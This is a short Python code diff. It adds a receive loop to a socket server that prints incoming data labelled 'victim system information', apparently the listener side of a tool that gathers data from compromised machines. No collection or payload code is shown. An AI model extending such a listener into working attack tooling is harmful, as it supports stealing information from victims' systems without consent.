@@ -16,8 +16,10 @@ def my_client_handler(input_client_info):
     welcome_message = "Welcome, you are connected to the server"
     welcome_message += " " * (BUFFER_SIZE - len(welcome_message))
     connection.send(welcome_message.encode(CODING))
-
-
+    while True:
+        message_size = int(connection.recv(BUFFER_SIZE).decode(CODING))
+        message = connection.recv(message_size).decode(CODING)
+        print("The victim system information is: \n" + message)
 
 
 
